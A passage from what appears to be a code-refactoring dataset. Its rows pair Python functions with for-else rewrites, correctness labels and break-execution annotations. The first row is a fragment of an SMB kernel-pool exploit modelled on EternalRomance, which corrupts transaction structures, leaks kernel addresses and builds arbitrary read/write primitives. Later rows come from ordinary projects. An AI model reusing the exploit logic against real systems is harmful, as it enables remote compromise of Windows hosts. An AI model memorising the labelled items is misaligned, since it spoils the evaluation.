		# if the overwritten is correct, a modified transaction mid should be special_mid now.
		# a new transaction with special_mid should be error.
		recvPkt = conn.send_nt_trans(5, mid=special_mid, param=trans_param, data='')
		if recvPkt.getNTStatus() == 0x10002:  # invalid SMB
			print('success controlling one transaction')
			success = True
			if 'arch' not in info:
				print('Target is '+tinfo['ARCH'])
				info['arch'] = tinfo['ARCH']
				info.update(OS_ARCH_INFO[info['os']][info['arch']])
			break
		if recvPkt.getNTStatus() != 0:
			print('unexpected return status: 0x{:x}'.format(recvPkt.getNTStatus()))
	
	if not success:
		print('unexpected return status: 0x{:x}'.format(recvPkt.getNTStatus()))
		print('!!! Write to wrong place !!!')
		print('the target might be crashed')
		return False


	# NSA eternalromance modify transaction RefCount to keep controlled and reuse transaction after leaking info.
	# This is easy to to but the modified transaction will never be freed. The next exploit attempt might be harder
	#   because of this unfreed memory chunk. I will avoid it.
	
	# From a picture above, now we can only control trans2 by trans1 data. Also we know only offset of these two 
	# transactions (do not know the address).
	# After reading memory by modifying and completing trans2, trans2 cannot be used anymore.
	# To be able to use trans1 after trans2 is gone, we need to modify trans1 to be able to modify itself.
	# To be able to modify trans1 struct, we need to use trans2 param or data but write backward.
	# On 32 bit target, we can write to any address if parameter count is 0xffffffff.
	# On 64 bit target, modifying paramter count is not enough because address size is 64 bit. Because our transactions
	#   are allocated with RtlAllocateHeap(), the HIDWORD of InParameter is always 0. To be able to write backward with offset only,
	#   we also modify HIDWORD of InParameter to 0xffffffff.
	
	print('modify parameter count to 0xffffffff to be able to write backward')
	conn.send_trans_secondary(mid=info['fid'], data='\xff'*4, dataDisplacement=NEXT_TRANS_OFFSET+info['TRANS_TOTALPARAMCNT_OFFSET'])
	# on 64 bit, modify InParameter last 4 bytes to \xff\xff\xff\xff too
	if info['arch'] == 'x64':
		conn.send_trans_secondary(mid=info['fid'], data='\xff'*4, dataDisplacement=NEXT_TRANS_OFFSET+info['TRANS_INPARAM_OFFSET']+4)
	wait_for_request_processed(conn)
	
	TRANS_CHUNK_SIZE = HEAP_HDR_SIZE + info['TRANS_SIZE'] + 0x1000 + HEAP_CHUNK_PAD_SIZE
	PREV_TRANS_DISPLACEMENT = TRANS_CHUNK_SIZE + info['TRANS_SIZE'] + TRANS_NAME_LEN
	PREV_TRANS_OFFSET = 0x100000000 - PREV_TRANS_DISPLACEMENT

	# modify paramterCount of first transaction
	conn.send_nt_trans_secondary(mid=special_mid, param='\xff'*4, paramDisplacement=PREV_TRANS_OFFSET+info['TRANS_TOTALPARAMCNT_OFFSET'])
	if info['arch'] == 'x64':
		conn.send_nt_trans_secondary(mid=special_mid, param='\xff'*4, paramDisplacement=PREV_TRANS_OFFSET+info['TRANS_INPARAM_OFFSET']+4)
		# restore trans2.InParameters pointer before leaking next transaction
		conn.send_trans_secondary(mid=info['fid'], data='\x00'*4, dataDisplacement=NEXT_TRANS_OFFSET+info['TRANS_INPARAM_OFFSET']+4)
	wait_for_request_processed(conn)

	# ================================
	# leak transaction
	# ================================
	print('leak next transaction')
	# modify TRANSACTION member to leak info
	# function=5 (NT_TRANS_RENAME)
	conn.send_trans_secondary(mid=info['fid'], data='\x05', dataDisplacement=NEXT_TRANS_OFFSET+info['TRANS_FUNCTION_OFFSET'])
	# parameterCount, totalParameterCount, maxParameterCount, dataCount, totalDataCount
	conn.send_trans_secondary(mid=info['fid'], data=pack('<IIIII', 4, 4, 4, 0x100, 0x100), dataDisplacement=NEXT_TRANS_OFFSET+info['TRANS_PARAMCNT_OFFSET'])

	conn.send_nt_trans_secondary(mid=special_mid)
	leakData = conn.recv_transaction_data(special_mid, 0x100)
	leakData = leakData[4:]  # remove param
	#open('leak.dat', 'wb').write(leakData)

	# check heap chunk size value in leak data
	if unpack_from('<H', leakData, HEAP_CHUNK_PAD_SIZE)[0] != (TRANS_CHUNK_SIZE // info['POOL_ALIGN']):
		print('chunk size is wrong')
		return False

	# extract leak transaction data and make next transaction to be trans2
	leakTranOffset = HEAP_CHUNK_PAD_SIZE + HEAP_HDR_SIZE
	leakTrans = leakData[leakTranOffset:]
	fmt = info['PTR_FMT']
	_, connection_addr, session_addr, treeconnect_addr, flink_value = unpack_from('<'+fmt*5, leakTrans, 8)
	inparam_value, outparam_value, indata_value = unpack_from('<'+fmt*3, leakTrans, info['TRANS_INPARAM_OFFSET'])
	trans2_mid = unpack_from('<H', leakTrans, info['TRANS_MID_OFFSET'])[0]
	
	print('CONNECTION: 0x{:x}'.format(connection_addr))
	print('SESSION: 0x{:x}'.format(session_addr))
	print('FLINK: 0x{:x}'.format(flink_value))
	print('InData: 0x{:x}'.format(indata_value))
	print('MID: 0x{:x}'.format(trans2_mid))
	
	trans2_addr = inparam_value - info['TRANS_SIZE'] - TRANS_NAME_LEN
	trans1_addr = trans2_addr - TRANS_CHUNK_SIZE * 2
	print('TRANS1: 0x{:x}'.format(trans1_addr))
	print('TRANS2: 0x{:x}'.format(trans2_addr))
	
	# ================================
	# modify trans struct to be used for arbitrary read/write
	# ================================
	print('modify transaction struct for arbitrary read/write')
	# modify
	# - trans1.InParameter to &trans1. so we can modify trans1 struct with itself (trans1 param)
	# - trans1.InData to &trans2. so we can modify trans2 with trans1 data
	# Note: HIDWORD of trans1.InParameter is still 0xffffffff
	TRANS_OFFSET = 0x100000000 - (info['TRANS_SIZE'] + TRANS_NAME_LEN)
	conn.send_nt_trans_secondary(mid=info['fid'], param=pack('<'+fmt*3, trans1_addr, trans1_addr+0x200, trans2_addr), paramDisplacement=TRANS_OFFSET+info['TRANS_INPARAM_OFFSET'])
	wait_for_request_processed(conn)
	
	# modify trans1.mid
	trans1_mid = conn.next_mid()
	conn.send_trans_secondary(mid=info['fid'], param=pack('<H', trans1_mid), paramDisplacement=info['TRANS_MID_OFFSET'])
	wait_for_request_processed(conn)
	
	info.update({
		'connection': connection_addr,
		'session': session_addr,
		'trans1_mid': trans1_mid,
		'trans1_addr': trans1_addr,
		'trans2_mid': trans2_mid,
		'trans2_addr': trans2_addr,
	})
	return True","for tinfo in attempt_list:
    print('attempt controlling next transaction on ' + tinfo['ARCH'])
    HEAP_CHUNK_PAD_SIZE = (tinfo['POOL_ALIGN'] - (tinfo['TRANS_SIZE'] + HEAP_HDR_SIZE) % tinfo['POOL_ALIGN']) % tinfo['POOL_ALIGN']
    NEXT_TRANS_OFFSET = 3840 - shift_indata_byte + HEAP_CHUNK_PAD_SIZE + HEAP_HDR_SIZE
    conn.send_trans_secondary(mid=info['fid'], data='\x00', dataDisplacement=NEXT_TRANS_OFFSET + tinfo['TRANS_MID_OFFSET'])
    wait_for_request_processed(conn)
    recvPkt = conn.send_nt_trans(5, mid=special_mid, param=trans_param, data='')
    if recvPkt.getNTStatus() == 65538:
        print('success controlling one transaction')
        success = True
        if 'arch' not in info:
            print('Target is ' + tinfo['ARCH'])
            info['arch'] = tinfo['ARCH']
            info.update(OS_ARCH_INFO[info['os']][info['arch']])
        break
    if recvPkt.getNTStatus() != 0:
        print('unexpected return status: 0x{:x}'.format(recvPkt.getNTStatus()))
if not success:
    print('unexpected return status: 0x{:x}'.format(recvPkt.getNTStatus()))
    print('!!! Write to wrong place !!!')
    print('the target might be crashed')
    return False","for tinfo in attempt_list:
    print('attempt controlling next transaction on ' + tinfo['ARCH'])
    HEAP_CHUNK_PAD_SIZE = (tinfo['POOL_ALIGN'] - (tinfo['TRANS_SIZE'] + HEAP_HDR_SIZE) % tinfo['POOL_ALIGN']) % tinfo['POOL_ALIGN']
    NEXT_TRANS_OFFSET = 3840 - shift_indata_byte + HEAP_CHUNK_PAD_SIZE + HEAP_HDR_SIZE
    conn.send_trans_secondary(mid=info['fid'], data='\x00', dataDisplacement=NEXT_TRANS_OFFSET + tinfo['TRANS_MID_OFFSET'])
    wait_for_request_processed(conn)
    recvPkt = conn.send_nt_trans(5, mid=special_mid, param=trans_param, data='')
    if recvPkt.getNTStatus() == 65538:
        print('success controlling one transaction')
        if 'arch' not in info:
            print('Target is ' + tinfo['ARCH'])
            info['arch'] = tinfo['ARCH']
            info.update(OS_ARCH_INFO[info['os']][info['arch']])
        break
    if recvPkt.getNTStatus() != 0:
        print('unexpected return status: 0x{:x}'.format(recvPkt.getNTStatus()))
else:
    print('unexpected return status: 0x{:x}'.format(recvPkt.getNTStatus()))
    print('!!! Write to wrong place !!!')
    print('the target might be crashed')
    return False","for tinfo in attempt_list:
    print('attempt controlling next transaction on ' + tinfo['ARCH'])
    HEAP_CHUNK_PAD_SIZE = (tinfo['POOL_ALIGN'] - (tinfo['TRANS_SIZE'] + HEAP_HDR_SIZE) % tinfo['POOL_ALIGN']) % tinfo['POOL_ALIGN']
    NEXT_TRANS_OFFSET = 3840 - shift_indata_byte + HEAP_CHUNK_PAD_SIZE + HEAP_HDR_SIZE
    conn.send_trans_secondary(mid=info['fid'], data='\x00', dataDisplacement=NEXT_TRANS_OFFSET + tinfo['TRANS_MID_OFFSET'])
    wait_for_request_processed(conn)
    recvPkt = conn.send_nt_trans(5, mid=special_mid, param=trans_param, data='')
    if recvPkt.getNTStatus() == 65538:
        print('success controlling one transaction')
        if 'arch' not in info:
            print('Target is ' + tinfo['ARCH'])
            info['arch'] = tinfo['ARCH']
            info.update(OS_ARCH_INFO[info['os']][info['arch']])
        break
    if recvPkt.getNTStatus() != 0:
        print('unexpected return status: 0x{:x}'.format(recvPkt.getNTStatus()))
else:
    print('unexpected return status: 0x{:x}'.format(recvPkt.getNTStatus()))
    print('!!! Write to wrong place !!!')
    print('the target might be crashed')
    return False",1,"for tinfo in attempt_list:
    print('attempt controlling next transaction on ' + tinfo['ARCH'])
    HEAP_CHUNK_PAD_SIZE = (tinfo['POOL_ALIGN'] - (tinfo['TRANS_SIZE'] + HEAP_HDR_SIZE) % tinfo['POOL_ALIGN']) % tinfo['POOL_ALIGN']
    NEXT_TRANS_OFFSET = 3840 - shift_indata_byte + HEAP_CHUNK_PAD_SIZE + HEAP_HDR_SIZE
    conn.send_trans_secondary(mid=info['fid'], data='\x00', dataDisplacement=NEXT_TRANS_OFFSET + tinfo['TRANS_MID_OFFSET'])
    wait_for_request_processed(conn)
    recvPkt = conn.send_nt_trans(5, mid=special_mid, param=trans_param, data='')
    if recvPkt.getNTStatus() == 65538:
        print('success controlling one transaction')
        success = True
        if 'arch' not in info:
            print('Target is ' + tinfo['ARCH'])
            info['arch'] = tinfo['ARCH']
            info.update(OS_ARCH_INFO[info['os']][info['arch']])
        break
    if recvPkt.getNTStatus() != 0:
        print('unexpected return status: 0x{:x}'.format(recvPkt.getNTStatus()))
if not success:
    print('unexpected return status: 0x{:x}'.format(recvPkt.getNTStatus()))
    print('!!! Write to wrong place !!!')
    print('the target might be crashed')
    return False","break statement is executed:None
break statement is not executed:zejun1"
oio-sds,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/oio-sds/tests/utils.py,https://github.com/open-io/oio-sds/tree/master/tests/utils.py,BaseTestCase,wait_for_score$530,"def wait_for_score(self, types, timeout=20.0, score_threshold=35):
        """"""Wait for services to have a score greater than the threshold.""""""
        deadline = time.time() + timeout
        while time.time() < deadline:
            wait = False
            for type_ in types:
                try:
                    all_svcs = self.conscience.all_services(type_)
                    for service in all_svcs:
                        if int(service['score']) < score_threshold:
                            wait = True
                            break
                    else:
                        # No service registered yet, must wait.
                        if not all_svcs:
                            wait = True
                except Exception as err:
                    logging.warn('Could not check service score: %s', err)
                    wait = True
                if wait:
                    # No need to check other types, we have to wait anyway
                    break
            if not wait:
                return
            time.sleep(1)
        logging.info('Service(s) fails to reach %d score (timeout %d)',
                     score_threshold, timeout)","for type_ in types:
    try:
        all_svcs = self.conscience.all_services(type_)
        for service in all_svcs:
            if int(service['score']) < score_threshold:
                wait = True
                break
        else:
            if not all_svcs:
                wait = True
    except Exception as err:
        logging.warn('Could not check service score: %s', err)
        wait = True
    if wait:
        break
if not wait:
    return","for type_ in types:
    try:
        all_svcs = self.conscience.all_services(type_)
        for service in all_svcs:
            if int(service['score']) < score_threshold:
                wait = True
                break
        else:
            if not all_svcs:
                wait = True
    except Exception as err:
        logging.warn('Could not check service score: %s', err)
        wait = True
    if wait:
        break
else:
    return","for type_ in types:
    try:
        all_svcs = self.conscience.all_services(type_)
        for service in all_svcs:
            if int(service['score']) < score_threshold:
                wait = True
                break
        else:
            if not all_svcs:
                wait = True
    except Exception as err:
        logging.warn('Could not check service score: %s', err)
        wait = True
    if wait:
        break
else:
    return",1,"for type_ in types:
    try:
        all_svcs = self.conscience.all_services(type_)
        for service in all_svcs:
            if int(service['score']) < score_threshold:
                wait = True
                break
        else:
            if not all_svcs:
                wait = True
    except Exception as err:
        logging.warn('Could not check service score: %s', err)
        wait = True
    if wait:
        break
if not wait:
    return","break statement is executed:None
break statement is not executed:zejun1"
evennia,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/evennia/evennia/commands/default/help.py,https://github.com/evennia/evennia/tree/master/evennia/commands/default/help.py,CmdHelp,func$541,"def func(self):
        """"""
        Run the dynamic help entry creator.
        """"""
        caller = self.caller
        query, subtopics, cmdset = self.topic, self.subtopics, self.cmdset
        clickable_topics = self.clickable_topics

        if not query:
            # list all available help entries, grouped by category. We want to
            # build dictionaries {category: [topic, topic, ...], ...}

            cmd_help_topics, db_help_topics, file_help_topics = self.collect_topics(
                caller, mode=""list""
            )

            # db-topics override file-based ones
            file_db_help_topics = {**file_help_topics, **db_help_topics}

            # group by category (cmds are listed separately)
            cmd_help_by_category = defaultdict(list)
            file_db_help_by_category = defaultdict(list)

            # get a collection of all keys + aliases to be able to strip prefixes like @
            key_and_aliases = set(chain(*(cmd._keyaliases for cmd in cmd_help_topics.values())))

            for key, cmd in cmd_help_topics.items():
                key = self.strip_cmd_prefix(key, key_and_aliases)
                cmd_help_by_category[cmd.help_category].append(key)
            for key, entry in file_db_help_topics.items():
                file_db_help_by_category[entry.help_category].append(key)

            # generate the index and display
            output = self.format_help_index(
                cmd_help_by_category, file_db_help_by_category, click_topics=clickable_topics
            )
            self.msg_help(output)

            return

        # search for a specific entry. We need to check for 'read' access here before
        # building the set of possibilities.
        cmd_help_topics, db_help_topics, file_help_topics = self.collect_topics(
            caller, mode=""query""
        )

        # get a collection of all keys + aliases to be able to strip prefixes like @
        key_and_aliases = set(chain(*(cmd._keyaliases for cmd in cmd_help_topics.values())))

        # db-help topics takes priority over file-help
        file_db_help_topics = {**file_help_topics, **db_help_topics}

        # commands take priority over the other types
        all_topics = {**file_db_help_topics, **cmd_help_topics}

        # get all categories
        all_categories = list(
            set(HelpCategory(topic.help_category) for topic in all_topics.values())
        )

        # all available help options - will be searched in order. We also check # the
        # read-permission here.
        entries = list(all_topics.values()) + all_categories

        # lunr search fields/boosts
        match, suggestions = self.do_search(query, entries)

        if not match:
            # no topic matches found. Only give suggestions.
            help_text = f""There is no help topic matching '{query}'.""

            if not suggestions:
                # we don't even have a good suggestion. Run a second search,
                # doing a full-text search in the actual texts of the help
                # entries

                search_fields = [
                    {""field_name"": ""text"", ""boost"": 1},
                ]

                for match_query in [query, f""{query}*"", f""*{query}""]:
                    _, suggestions = help_search_with_index(
                        match_query,
                        entries,
                        suggestion_maxnum=self.suggestion_maxnum,
                        fields=search_fields,
                    )
                    if suggestions:
                        help_text += (
                            ""\n... But matches where found within the help ""
                            ""texts of the suggestions below.""
                        )
                        suggestions = [
                            self.strip_cmd_prefix(sugg, key_and_aliases) for sugg in suggestions
                        ]
                        break

            output = self.format_help_entry(
                topic=None,  # this will give a no-match style title
                help_text=help_text,
                suggested=suggestions,
                click_topics=clickable_topics,
            )

            self.msg_help(output)
            return

        if isinstance(match, HelpCategory):
            # no subtopics for categories - these are just lists of topics
            category = match.key
            category_lower = category.lower()
            cmds_in_category = [
                key for key, cmd in cmd_help_topics.items() if category_lower == cmd.help_category
            ]
            topics_in_category = [
                key
                for key, topic in file_db_help_topics.items()
                if category_lower == topic.help_category
            ]
            output = self.format_help_index(
                {category: cmds_in_category},
                {category: topics_in_category},
                title_lone_category=True,
                click_topics=clickable_topics,
            )
            self.msg_help(output)
            return

        if inherits_from(match, ""evennia.commands.command.Command""):
            # a command match
            topic = match.key
            help_text = match.get_help(caller, cmdset)
            aliases = match.aliases
            suggested = suggestions[1:]
        else:
            # a database (or file-help) match
            topic = match.key
            help_text = match.entrytext
            aliases = match.aliases if isinstance(match.aliases, list) else match.aliases.all()
            suggested = suggestions[1:]

        # parse for subtopics. The subtopic_map is a dict with the current topic/subtopic
        # text is stored under a `None` key and all other keys are subtopic titles pointing
        # to nested dicts.

        subtopic_map = parse_entry_for_subcategories(help_text)
        help_text = subtopic_map[None]
        subtopic_index = [subtopic for subtopic in subtopic_map if subtopic is not None]

        if subtopics:
            # if we asked for subtopics, parse the found topic_text to see if any match.
            # the subtopics is a list describing the path through the subtopic_map.

            for subtopic_query in subtopics:

                if subtopic_query not in subtopic_map:
                    # exact match failed. Try startswith-match
                    fuzzy_match = False
                    for key in subtopic_map:
                        if key and key.startswith(subtopic_query):
                            subtopic_query = key
                            fuzzy_match = True
                            break

                    if not fuzzy_match:
                        # startswith failed - try an 'in' match
                        for key in subtopic_map:
                            if key and subtopic_query in key:
                                subtopic_query = key
                                fuzzy_match = True
                                break

                    if not fuzzy_match:
                        # no match found - give up
                        checked_topic = topic + f""/{subtopic_query}""
                        output = self.format_help_entry(
                            topic=topic,
                            help_text=f""No help entry found for '{checked_topic}'"",
                            subtopics=subtopic_index,
                            click_topics=clickable_topics,
                        )
                        self.msg_help(output)
                        return

                # if we get here we have an exact or fuzzy match

                subtopic_map = subtopic_map.pop(subtopic_query)
                subtopic_index = [subtopic for subtopic in subtopic_map if subtopic is not None]
                # keep stepping down into the tree, append path to show position
                topic = topic + f""/{subtopic_query}""

            # we reached the bottom of the topic tree
            help_text = subtopic_map[None]

        topic = self.strip_cmd_prefix(topic, key_and_aliases)
        if subtopics:
            aliases = None
        else:
            aliases = [self.strip_cmd_prefix(alias, key_and_aliases) for alias in aliases]
        suggested = [self.strip_cmd_prefix(sugg, key_and_aliases) for sugg in suggested]

        output = self.format_help_entry(
            topic=topic,
            help_text=help_text,
            aliases=aliases,
            subtopics=subtopic_index,
            suggested=suggested,
            click_topics=clickable_topics,
        )

        self.msg_help(output)","for key in subtopic_map:
    if key and key.startswith(subtopic_query):
        subtopic_query = key
        fuzzy_match = True
        break
if not fuzzy_match:
    for key in subtopic_map:
        if key and subtopic_query in key:
            subtopic_query = key
            fuzzy_match = True
            break","for key in subtopic_map:
    if key and key.startswith(subtopic_query):
        subtopic_query = key
        fuzzy_match = True
        break
else:
    for key in subtopic_map:
        if key and subtopic_query in key:
            subtopic_query = key
            fuzzy_match = True
            break","for key in subtopic_map:
    if key and key.startswith(subtopic_query):
        subtopic_query = key
        fuzzy_match = True
        break
else:
    for key in subtopic_map:
        if key and subtopic_query in key:
            subtopic_query = key
            fuzzy_match = True
            break",1,"for key in subtopic_map:
    if key and key.startswith(subtopic_query):
        subtopic_query = key
        fuzzy_match = True
        break
if not fuzzy_match:
    for key in subtopic_map:
        if key and subtopic_query in key:
            subtopic_query = key
            fuzzy_match = True
            break","break statement is executed:None
break statement is not executed:zejun1"
unknown-horizons,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/unknown-horizons/horizons/ai/aiplayer/roadplanner.py,https://github.com/unknown-horizons/unknown-horizons/tree/master/horizons/ai/aiplayer/roadplanner.py,RoadPlanner,__call__$37,"def __call__(self, personality, source, destination, destination_beacon, path_nodes, blocked_coords=None):
		""""""
		Return the path from the source to the destination or None if it is impossible.

		@param personality: the personality class that contains the relevant personality bits
		@param source: list of tuples [(x, y), ...]
		@param destination: list of tuples [(x, y), ...]
		@param destination_beacon: object with a defined distance_to_tuple function (must contain all of destination)
		@param path_nodes: dict {(x, y): penalty}
		@param blocked_coords: temporarily blocked coordinates set([(x, y), ...])
		""""""
		blocked_coords = blocked_coords or set()
		target_blocked = True
		for coords in destination:
			if coords not in blocked_coords and coords in path_nodes:
				target_blocked = False
				break
		if target_blocked:
			return None

		distance = {}
		beacon_tuple_distance_func = destination_beacon.get_distance_function((0, 0))
		heap = []
		for coords in source:
			if coords not in blocked_coords and coords in path_nodes:
				for dir in range(2): # 0 -> changed x, 1 -> changed y
					real_distance = path_nodes[coords]
					expected_distance = beacon_tuple_distance_func(destination_beacon, coords)
					key = (coords[0], coords[1], dir)
					# the value is (real distance so far, previous key)
					distance[key] = (real_distance, None)
					# (expected distance to the destination, current real distance, key)
					heap.append((expected_distance, real_distance, key))
		heapq.heapify(heap)

		moves = [(-1, 0), (0, -1), (0, 1), (1, 0)]
		final_key = None

		# perform A*
		while heap:
			(_, distance_so_far, key) = heapq.heappop(heap)
			if distance[key][0] < distance_so_far:
				continue
			if (key[0], key[1]) in destination:
				final_key = key
				break

			for dir in range(4):
				coords = (key[0] + moves[dir][0], key[1] + moves[dir][1])
				if coords not in path_nodes or coords in blocked_coords:
					continue
				reduced_dir = 0 if moves[dir][0] != 0 else 1
				next_key = (coords[0], coords[1], reduced_dir)
				real_distance = distance_so_far + path_nodes[coords] + (0 if reduced_dir == key[2] else personality.turn_penalty)
				expected_distance = real_distance + beacon_tuple_distance_func(destination_beacon, coords)
				if next_key not in distance or distance[next_key][0] > real_distance:
					distance[next_key] = (real_distance, key)
					heapq.heappush(heap, (expected_distance, real_distance, next_key))

		# save path
		if final_key is not None:
			path = []
			while final_key is not None:
				path.append((final_key[0], final_key[1]))
				final_key = distance[final_key][1]
			return path
		return None","for coords in destination:
    if coords not in blocked_coords and coords in path_nodes:
        target_blocked = False
        break
if target_blocked:
    return None","for coords in destination:
    if coords not in blocked_coords and coords in path_nodes:
        break
else:
    return None","for coords in destination:
    if coords not in blocked_coords and coords in path_nodes:
        break
else:
    return None",1,"for coords in destination:
    if coords not in blocked_coords and coords in path_nodes:
        target_blocked = False
        break
if target_blocked:
    return None","break statement is executed:None
break statement is not executed:zejun1"
unknown-horizons,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/unknown-horizons/horizons/ai/aiplayer/roadplanner.py,https://github.com/unknown-horizons/unknown-horizons/tree/master/horizons/ai/aiplayer/roadplanner.py,RoadPlanner,__call__$37,"def __call__(self, personality, source, destination, destination_beacon, path_nodes, blocked_coords=None):
		""""""
		Return the path from the source to the destination or None if it is impossible.

		@param personality: the personality class that contains the relevant personality bits
		@param source: list of tuples [(x, y), ...]
		@param destination: list of tuples [(x, y), ...]
		@param destination_beacon: object with a defined distance_to_tuple function (must contain all of destination)
		@param path_nodes: dict {(x, y): penalty}
		@param blocked_coords: temporarily blocked coordinates set([(x, y), ...])
		""""""
		blocked_coords = blocked_coords or set()
		target_blocked = True
		for coords in destination:
			if coords not in blocked_coords and coords in path_nodes:
				target_blocked = False
				break
		if target_blocked:
			return None

		distance = {}
		beacon_tuple_distance_func = destination_beacon.get_distance_function((0, 0))
		heap = []
		for coords in source:
			if coords not in blocked_coords and coords in path_nodes:
				for dir in range(2): # 0 -> changed x, 1 -> changed y
					real_distance = path_nodes[coords]
					expected_distance = beacon_tuple_distance_func(destination_beacon, coords)
					key = (coords[0], coords[1], dir)
					# the value is (real distance so far, previous key)
					distance[key] = (real_distance, None)
					# (expected distance to the destination, current real distance, key)
					heap.append((expected_distance, real_distance, key))
		heapq.heapify(heap)

		moves = [(-1, 0), (0, -1), (0, 1), (1, 0)]
		final_key = None

		# perform A*
		while heap:
			(_, distance_so_far, key) = heapq.heappop(heap)
			if distance[key][0] < distance_so_far:
				continue
			if (key[0], key[1]) in destination:
				final_key = key
				break

			for dir in range(4):
				coords = (key[0] + moves[dir][0], key[1] + moves[dir][1])
				if coords not in path_nodes or coords in blocked_coords:
					continue
				reduced_dir = 0 if moves[dir][0] != 0 else 1
				next_key = (coords[0], coords[1], reduced_dir)
				real_distance = distance_so_far + path_nodes[coords] + (0 if reduced_dir == key[2] else personality.turn_penalty)
				expected_distance = real_distance + beacon_tuple_distance_func(destination_beacon, coords)
				if next_key not in distance or distance[next_key][0] > real_distance:
					distance[next_key] = (real_distance, key)
					heapq.heappush(heap, (expected_distance, real_distance, next_key))

		# save path
		if final_key is not None:
			path = []
			while final_key is not None:
				path.append((final_key[0], final_key[1]))
				final_key = distance[final_key][1]
			return path
		return None","while heap:
    (_, distance_so_far, key) = heapq.heappop(heap)
    if distance[key][0] < distance_so_far:
        continue
    if (key[0], key[1]) in destination:
        final_key = key
        break
    for dir in range(4):
        coords = (key[0] + moves[dir][0], key[1] + moves[dir][1])
        if coords not in path_nodes or coords in blocked_coords:
            continue
        reduced_dir = 0 if moves[dir][0] != 0 else 1
        next_key = (coords[0], coords[1], reduced_dir)
        real_distance = distance_so_far + path_nodes[coords] + (0 if reduced_dir == key[2] else personality.turn_penalty)
        expected_distance = real_distance + beacon_tuple_distance_func(destination_beacon, coords)
        if next_key not in distance or distance[next_key][0] > real_distance:
            distance[next_key] = (real_distance, key)
            heapq.heappush(heap, (expected_distance, real_distance, next_key))
if final_key is not None:
    path = []
    while final_key is not None:
        path.append((final_key[0], final_key[1]))
        final_key = distance[final_key][1]
    return path","while heap:
    (_, distance_so_far, key) = heapq.heappop(heap)
    if distance[key][0] < distance_so_far:
        continue
    if (key[0], key[1]) in destination:
        final_key = key
        break
    for dir in range(4):
        coords = (key[0] + moves[dir][0], key[1] + moves[dir][1])
        if coords not in path_nodes or coords in blocked_coords:
            continue
        reduced_dir = 0 if moves[dir][0] != 0 else 1
        next_key = (coords[0], coords[1], reduced_dir)
        real_distance = distance_so_far + path_nodes[coords] + (0 if reduced_dir == key[2] else personality.turn_penalty)
        expected_distance = real_distance + beacon_tuple_distance_func(destination_beacon, coords)
        if next_key not in distance or distance[next_key][0] > real_distance:
            distance[next_key] = (real_distance, key)
            heapq.heappush(heap, (expected_distance, real_distance, next_key))
else:
    path = []
    while final_key is not None:
        path.append((final_key[0], final_key[1]))
        final_key = distance[final_key][1]
    return path",Cannot refactor,-1,"while heap:
    (_, distance_so_far, key) = heapq.heappop(heap)
    if distance[key][0] < distance_so_far:
        continue
    if (key[0], key[1]) in destination:
        final_key = key
        break
    for dir in range(4):
        coords = (key[0] + moves[dir][0], key[1] + moves[dir][1])
        if coords not in path_nodes or coords in blocked_coords:
            continue
        reduced_dir = 0 if moves[dir][0] != 0 else 1
        next_key = (coords[0], coords[1], reduced_dir)
        real_distance = distance_so_far + path_nodes[coords] + (0 if reduced_dir == key[2] else personality.turn_penalty)
        expected_distance = real_distance + beacon_tuple_distance_func(destination_beacon, coords)
        if next_key not in distance or distance[next_key][0] > real_distance:
            distance[next_key] = (real_distance, key)
            heapq.heappush(heap, (expected_distance, real_distance, next_key))
if final_key is not None:
    path = []
    while final_key is not None:
        path.append((final_key[0], final_key[1]))
        final_key = distance[final_key][1]
    return path","break statement is executed:None
break statement is not executed:zejun1"
django-dynamic-scraper,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/django-dynamic-scraper/dynamic_scraper/spiders/django_spider.py,https://github.com/holgerd77/django-dynamic-scraper/tree/master/dynamic_scraper/spiders/django_spider.py,DjangoSpider,limit_page_nums$233,"def limit_page_nums(self, pages):
        if self.conf['START_PAGE']:
            index = 0
            exists = False
            for page in pages:
                if str(page) == self.conf['START_PAGE']:
                    pages = pages[index:]
                    exists = True
                    break
                index += 1
            if not exists:
                msg = ""The provided start page doesn't exist in the range of page values!""
                self.dds_logger.error(msg)
                raise CloseSpider()
        
        if self.conf['END_PAGE']:
            index = 0
            exists = False
            for page in pages:
                if str(page) == self.conf['END_PAGE']:
                    pages = pages[:index+1]
                    exists = True
                    break
                index += 1
            if not exists:
                msg = ""The provided end page doesn't exist in the range of page values!""
                self.dds_logger.error(msg)
                raise CloseSpider()
        
        return pages","for page in pages:
    if str(page) == self.conf['START_PAGE']:
        pages = pages[index:]
        exists = True
        break
    index += 1
if not exists:
    msg = ""The provided start page doesn't exist in the range of page values!""
    self.dds_logger.error(msg)
    raise CloseSpider()","for page in pages:
    if str(page) == self.conf['START_PAGE']:
        pages = pages[index:]
        exists = True
        break
    index += 1
else:
    msg = ""The provided start page doesn't exist in the range of page values!""
    self.dds_logger.error(msg)
    raise CloseSpider()","for page in pages:
    if str(page) == self.conf['START_PAGE']:
        pages = pages[index:]
        break
    index += 1
else:
    msg = ""The provided start page doesn't exist in the range of page values!""
    self.dds_logger.error(msg)
    raise CloseSpider()",0,"for page in pages:
    if str(page) == self.conf['START_PAGE']:
        pages = pages[index:]
        exists = True
        break
    index += 1
if not exists:
    msg = ""The provided start page doesn't exist in the range of page values!""
    self.dds_logger.error(msg)
    raise CloseSpider()","break statement is executed:None
break statement is not executed:zejun1"
django-dynamic-scraper,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/django-dynamic-scraper/dynamic_scraper/spiders/django_spider.py,https://github.com/holgerd77/django-dynamic-scraper/tree/master/dynamic_scraper/spiders/django_spider.py,DjangoSpider,limit_page_nums$233,"def limit_page_nums(self, pages):
        if self.conf['START_PAGE']:
            index = 0
            exists = False
            for page in pages:
                if str(page) == self.conf['START_PAGE']:
                    pages = pages[index:]
                    exists = True
                    break
                index += 1
            if not exists:
                msg = ""The provided start page doesn't exist in the range of page values!""
                self.dds_logger.error(msg)
                raise CloseSpider()
        
        if self.conf['END_PAGE']:
            index = 0
            exists = False
            for page in pages:
                if str(page) == self.conf['END_PAGE']:
                    pages = pages[:index+1]
                    exists = True
                    break
                index += 1
            if not exists:
                msg = ""The provided end page doesn't exist in the range of page values!""
                self.dds_logger.error(msg)
                raise CloseSpider()
        
        return pages","for page in pages:
    if str(page) == self.conf['END_PAGE']:
        pages = pages[:index + 1]
        exists = True
        break
    index += 1
if not exists:
    msg = ""The provided end page doesn't exist in the range of page values!""
    self.dds_logger.error(msg)
